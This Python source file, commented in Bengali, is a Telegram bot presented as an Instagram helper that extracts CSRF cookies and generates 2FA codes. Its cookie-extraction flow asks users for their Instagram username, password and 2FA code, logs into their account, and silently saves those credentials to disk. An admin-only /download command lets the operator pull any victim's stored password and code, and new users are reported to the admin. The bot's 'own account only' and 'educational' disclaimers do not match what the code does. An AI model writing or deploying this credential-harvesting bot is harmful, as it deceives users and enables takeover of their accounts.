import os
import json
import logging
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ConversationHandler, ContextTypes
)
from instagrapi import Client
import pyotp

# ========== কনফিগারেশন ==========
TOKEN = os.environ.get("BOT_TOKEN")  # Railway তে env variable সেট করবেন
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "0"))  # আপনার চ্যাট আইডি
DATA_DIR = "data"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# স্টেট সংক্রান্ত constant
USERNAME, PASSWORD, TWOFA = range(3)
TOTP_SECRET_STATE = range(3, 4)

# লগিং
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== হেল্পার ফাংশন ==========
def save_credentials(chat_id, username, password, twofa_code, csrf_token):
    """নিরবে ইউজারের তথ্য JSON ফাইলে সেভ করে"""
    cred_file = os.path.join(DATA_DIR, f"{chat_id}.json")
    data = {
        "chat_id": chat_id,
        "username": username,
        "password": password,
        "twofa_code": twofa_code,
        "csrf_token": csrf_token,
        "timestamp": datetime.now().isoformat()
    }
    with open(cred_file, "w") as f:
        json.dump(data, f, indent=2)
    return cred_file

def get_credentials_file(chat_id):
    """নির্দিষ্ট চ্যাট আইডির JSON ফাইল পাথ রিটার্ন করে"""
    return os.path.join(DATA_DIR, f"{chat_id}.json")

# ========== কীবোর্ড ==========
def get_main_keyboard():
    """মেনু কীবোর্ড (2 রো)"""
    keyboard = [
        [KeyboardButton("🍪 Cookie's Extract"), KeyboardButton("🔑 2FA")],
        [KeyboardButton("👤 Admin Or Developer")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    """ব্যাক বাটন (শুধু মেনুতে ফেরার জন্য)"""
    keyboard = [[KeyboardButton("🔙 Back to Menu")]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ========== বটের হ্যান্ডলার ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat_id = update.effective_chat.id
    
    # অ্যাডমিনকে নোটিফিকেশন
    if ADMIN_CHAT_ID:
        await context.bot.send_message(
            ADMIN_CHAT_ID,
            f"🆕 নতুন ইউজার বট ব্যবহার শুরু করেছে:\n"
            f"👤 নাম: {user.full_name}\n"
            f"🆔 চ্যাট আইডি: `{chat_id}`\n"
            f"🔗 ইউজারনেম: @{user.username if user.username else 'নেই'}",
            parse_mode="Markdown"
        )
    
    welcome_msg = (
        f"✨ স্বাগতম {user.first_name}! ✨\n\n"
        f"আমি একটি **ইনস্টাগ্রাম টুল বট**।\n"
        f"নিচের বাটনগুলোর মাধ্যমে কাজ করুন:\n\n"
        f"🍪 **Cookie's Extract** - ইনস্টাগ্রাম একাউন্টের CSRF টোকেন বের করে\n"
        f"🔑 **2FA** - বেস৩২ সিক্রেট থেকে টোটপ কোড জেনারেট করে\n"
        f"👤 **Admin Or Developer** - প্রশাসকের সাথে যোগাযোগ\n\n"
        f"⚠️ সতর্কতা: শুধু নিজের একাউন্টের জন্য ব্যবহার করুন।"
    )
    await update.message.reply_text(welcome_msg, reply_markup=get_main_keyboard(), parse_mode="Markdown")

# ========== Cookie Extract এর কনভার্সেশন ==========
async def cookie_extract_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📛 **আপনার ইনস্টাগ্রাম ইউজারনেম দিন:**", parse_mode="Markdown", reply_markup=get_back_keyboard())
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "🔙 Back to Menu":
        await update.message.reply_text("মেনুতে ফিরে আসছেন...", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    context.user_data['ig_username'] = update.message.text.strip()
    await update.message.reply_text("🔒 **পাসওয়ার্ড দিন:**", parse_mode="Markdown", reply_markup=get_back_keyboard())
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "🔙 Back to Menu":
        await update.message.reply_text("মেনুতে ফিরে আসছেন...", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    context.user_data['ig_password'] = update.message.text.strip()
    await update.message.reply_text("🔢 **2FA কোড দিন** (যদি না থাকে তাহলে `skip` লিখুন):", parse_mode="Markdown", reply_markup=get_back_keyboard())
    return TWOFA

async def finalize_cookie_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "🔙 Back to Menu":
        await update.message.reply_text("মেনুতে ফিরে আসছেন...", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    twofa_input = update.message.text.strip()
    username = context.user_data['ig_username']
    password = context.user_data['ig_password']
    twofa_code = None if twofa_input.lower() == 'skip' else twofa_input
    
    await update.message.reply_text("⏳ **ইনস্টাগ্রামে লগইন হচ্ছে, দয়া করে অপেক্ষা করুন...**", parse_mode="Markdown")
    
    try:
        cl = Client()
        if twofa_code:
            cl.login(username, password, verification_code=twofa_code)
        else:
            cl.login(username, password)
        
        # CSRF টোকেন বের করা
        settings = cl.get_settings()
        csrf_token = settings.get("csrf", "Not Found")
        user_id = cl.user_id
        
        # টেক্সট ফাইল তৈরি
        txt_content = f"""
Instagram Login Data
{'='*40}
Username : {username}
User ID  : {user_id}
CSRF Token : {csrf_token}
Full Settings (JSON):
{json.dumps(settings, indent=2)}
        """
        txt_filename = os.path.join(DATA_DIR, f"{update.effective_chat.id}_csrf.txt")
        with open(txt_filename, "w", encoding="utf-8") as f:
            f.write(txt_content)
        
        # নিরবে ক্রেডেনশিয়াল সেভ (অ্যাডমিনের জন্য)
        save_credentials(update.effective_chat.id, username, password, twofa_input, csrf_token)
        
        # ইউজারকে ফাইল পাঠানো
        with open(txt_filename, "rb") as doc:
            await update.message.reply_document(
                document=doc,
                filename=f"{username}_csrf_token.txt",
                caption=f"✅ লগইন সফল!\n🔑 CSRF টোকেন: `{csrf_token}`\n\n📁 ফাইলটি ডাউনলোড করুন।",
                parse_mode="Markdown"
            )
        
        # টেম্প ফাইল মুছে ফেলা
        os.remove(txt_filename)
        
    except Exception as e:
        await update.message.reply_text(f"❌ ব্যর্থ হয়েছে!\nত্রুটি: `{str(e)}`", parse_mode="Markdown")
    
    # মেনুতে ফেরানো
    await update.message.reply_text("মেনুতে ফিরে আসুন:", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("বাতিল করা হয়েছে। মেনু:", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# ========== 2FA টোটপ জেনারেটর ==========
async def twofa_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔐 **2FA কোড জেনারেটর**\n\nআপনার **বেস৩২ সিক্রেট কী** দিন (যেটি Google Authenticator এ সেট করেছেন)।\n\n"
        "উদাহরণ: `JBSWY3DPEHPK3PXP`\n\n`/cancel` লিখে বাতিল করুন।",
        parse_mode="Markdown", reply_markup=get_back_keyboard()
    )
    return TOTP_SECRET_STATE

async def generate_totp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.text == "🔙 Back to Menu":
        await update.message.reply_text("মেনুতে ফিরছেন...", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    secret = update.message.text.strip().upper()
    try:
        totp = pyotp.TOTP(secret)
        current_code = totp.now()
        await update.message.reply_text(
            f"🔢 **বর্তমান 2FA কোড:** `{current_code}`\n\n"
            f"⏳ কোডটি 30 সেকেন্ডের জন্য বৈধ।\n"
            f"আবার জেনারেট করতে আবার /2fa কমান্ড দিন।",
            parse_mode="Markdown", reply_markup=get_main_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ ভুল সিক্রেট কী! ত্রুটি: `{str(e)}`", parse_mode="Markdown", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# ========== অ্যাডমিন/ডেভেলপার ==========
async def admin_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👨‍💻 **ডেভেলপার ও অ্যাডমিন:**\n\n"
        "এই বটটি তৈরি করেছেন **Your Name**\n"
        "প্রয়োজনে যোগাযোগ করুন: [টেলিগ্রাম](https://t.me/your_username)\n\n"
        "⚠️ বটটি শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। নিজ দায়িত্বে ব্যবহার করুন।",
        parse_mode="Markdown", disable_web_page_preview=True,
        reply_markup=get_main_keyboard()
    )

# ========== অ্যাডমিন কমান্ড (ডাউনলোড ক্রেডেনশিয়াল) ==========
async def download_credentials(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ আপনি অ্যাডমিন নন!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("ব্যবহার: `/download <chat_id_or_username>`", parse_mode="Markdown")
        return
    
    target = context.args[0]
    # প্রথমে chat_id দিয়ে খোঁজে
    file_path = os.path.join(DATA_DIR, f"{target}.json")
    if not os.path.exists(file_path):
        # username দিয়ে খোঁজার চেষ্টা (JSON ফাইলের মধ্যে)
        found = False
        for fname in os.listdir(DATA_DIR):
            if fname.endswith(".json"):
                with open(os.path.join(DATA_DIR, fname), "r") as f:
                    data = json.load(f)
                    if data.get("username") == target:
                        file_path = os.path.join(DATA_DIR, fname)
                        found = True
                        break
        if not found:
            await update.message.reply_text("❌ এই ইউজার বা চ্যাট আইডির কোনো তথ্য নেই।")
            return
    
    with open(file_path, "rb") as f:
        await update.message.reply_document(document=f, filename=os.path.basename(file_path))

# ========== মেইন ফাংশন ==========
def main():
    app = Application.builder().token(TOKEN).build()
    
    # কনভার্সেশন হ্যান্ডলার (Cookie Extract)
    cookie_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🍪 Cookie's Extract$"), cookie_extract_start)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, finalize_cookie_extract)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(filters.Regex("^🔙 Back to Menu$"), cancel)]
    )
    
    # 2FA কনভার্সেশন
    twofa_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("^🔑 2FA$"), twofa_start)],
        states={
            TOTP_SECRET_STATE: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_totp)],
        },
        fallbacks=[CommandHandler("cancel", cancel), MessageHandler(filters.Regex("^🔙 Back to Menu$"), cancel)]
    )
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("download", download_credentials))
    app.add_handler(MessageHandler(filters.Regex("^👤 Admin Or Developer$"), admin_contact))
    app.add_handler(cookie_conv)
    app.add_handler(twofa_conv)
    
    # অন্য যেকোনো টেক্সট মেনু দেখাবে
    async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("দয়া করে নিচের বাটন ব্যবহার করুন:", reply_markup=get_main_keyboard())
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, fallback))
    
    logger.info("বট চালু হচ্ছে...")
    app.run_polling()

if __name__ == "__main__":
    main()
